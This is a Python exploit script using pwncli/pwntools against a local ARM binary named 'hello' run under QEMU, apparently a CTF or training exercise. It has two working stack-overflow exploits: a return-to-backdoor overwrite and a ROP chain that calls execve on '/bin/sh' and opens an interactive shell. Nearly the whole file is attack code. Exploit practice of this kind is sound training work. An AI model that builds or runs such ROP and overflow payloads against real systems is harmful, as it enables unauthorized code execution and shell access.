from pwncli import *  # type: ignore # Add other required names explicitly

context.binary = './hello'
context.timeout = 5

import argparse

parser = argparse.ArgumentParser(description='Exploit static binary with QEMU')
parser.add_argument('--debug', action='store_true', help='Run in debug mode')
args = parser.parse_args()

debug_flag = False

if args.debug:
    context.log_level = 'debug'
    gift.io = process(['qemu-arm', '-g', '1234', '-L', './lib','./hello'])
    debug_flag = True
else:
    context.log_level = 'info'
    gift.io = process(['qemu-arm', '-L', './lib','./hello'])

gift.elf = ELF('./hello')

io: tube = gift.io
elf: ELF = gift.elf

def ret2text():
    back_door = 0x105EC
    payload = flat([cyclic(0x18), p32(back_door)])
    
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()

def ret2syscall():
    bin_sh = 0x00010810
    pop_r0_4_lr_bx_lr = 0x00010618
    pop_r7_lr_bx_lr = 0x00010620
    svc_0 = 0x00010628
    payload = flat([cyclic(0x18), 
                p32(pop_r0_4_lr_bx_lr), 
                p32(bin_sh), p32(0), p32(0), p32(0), p32(0), 
                p32(pop_r7_lr_bx_lr), 
                p32(11), p32(svc_0)])
  
    if debug_flag: pause()
    sa("Enter a string: ",  payload)
    if debug_flag: pause()

if __name__ == "__main__":
    ret2syscall()

    ru("You entered: ")
    gift.io.interactive()